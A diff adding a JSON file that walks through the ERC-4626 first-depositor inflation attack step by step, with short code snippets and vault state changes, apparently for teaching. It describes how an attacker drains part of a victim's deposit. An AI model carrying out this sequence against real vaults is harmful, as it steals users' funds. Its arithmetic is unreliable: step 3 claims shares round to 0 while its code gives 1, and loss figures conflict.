@@ -1,0 +1,92 @@
+{
+  "title": "ERC-4626 First-Depositor Inflation Attack",
+  "severity": "Critical",
+  "chain": "Ethereum",
+  "actors": ["Attacker", "Vault", "Victim"],
+  "incidents": [
+    {
+      "name": "Generic ERC-4626 inflation",
+      "date": null,
+      "chain": "Ethereum",
+      "loss_usd": "varies",
+      "note": "Common pattern in vault deployments without virtual shares",
+      "reference_eip": "https://eips.ethereum.org/EIPS/eip-4626"
+    }
+  ],
+  "initial_state": {
+    "Vault Shares": "0",
+    "Vault Assets": "0",
+    "Share Price": "N/A",
+    "Attacker Shares": "0",
+    "Victim Shares": "0"
+  },
+  "steps": [
+    {
+      "step": 1,
+      "from": "Attacker",
+      "to": "Vault",
+      "action": "deposit(1 wei)",
+      "description": "Attacker is the FIRST depositor — deposits 1 wei of the asset token",
+      "code": "vault.deposit(1, attacker);\n// shares = 1 (1:1 for first deposit)\n// totalSupply = 1\n// totalAssets = 1",
+      "state_changes": {
+        "Vault Shares": "1",
+        "Vault Assets": "1 wei",
+        "Attacker Shares": "1",
+        "Share Price": "1 wei/share"
+      }
+    },
+    {
+      "step": 2,
+      "from": "Attacker",
+      "to": "Vault",
+      "action": "donate(10000e18 tokens)",
+      "description": "Attacker directly transfers tokens to the vault (NOT via deposit!) — inflates totalAssets without minting shares",
+      "code": "// Direct transfer (donation)\ntoken.transfer(\n  address(vault),\n  10_000e18\n);\n// totalAssets = 10000e18 + 1\n// totalSupply = 1 (unchanged!)",
+      "state_changes": {
+        "Vault Assets": "10,000 tokens",
+        "Share Price": "10,000 tokens/share ⚠️"
+      }
+    },
+    {
+      "step": 3,
+      "from": "Victim",
+      "to": "Vault",
+      "action": "deposit(19999e18 tokens)",
+      "description": "Victim deposits 19,999 tokens — but share calculation rounds DOWN to 0!",
+      "code": "// shares = deposit * totalSupply\n//          / totalAssets\n// shares = 19999e18 * 1\n//          / (10000e18 + 1)\n// shares = 1 (rounds DOWN!)\n// LOST: ~10,000 tokens!",
+      "state_changes": {
+        "Vault Assets": "29,999 tokens",
+        "Vault Shares": "2",
+        "Victim Shares": "1",
+        "Share Price": "~15,000 tokens/share"
+      }
+    },
+    {
+      "step": 4,
+      "from": "Attacker",
+      "to": "Vault",
+      "action": "redeem(1 share)",
+      "description": "Attacker redeems their 1 share — gets HALF of all vault assets!",
+      "code": "vault.redeem(\n  1, attacker, attacker\n);\n// assets = 1 * 29999e18 / 2\n// assets = ~14,999.5 tokens\n// Profit: ~5,000 tokens! 💰",
+      "state_changes": {
+        "Attacker Shares": "0",
+        "Vault Shares": "1",
+        "Vault Assets": "~15,000 tokens",
+        "Share Price": "~15,000 tokens/share"
+      }
+    },
+    {
+      "step": 5,
+      "from": "Victim",
+      "to": "Vault",
+      "action": "redeem(1 share)",
+      "description": "Victim redeems — gets back ~15,000 instead of their 19,999 deposit",
+      "code": "vault.redeem(\n  1, victim, victim\n);\n// Gets: ~15,000 tokens\n// Deposited: 19,999 tokens\n// LOSS: ~5,000 tokens ⚠️",
+      "state_changes": {
+        "Victim Shares": "0",
+        "Vault Assets": "0",
+        "Vault Shares": "0"
+      }
+    }
+  ]
+}
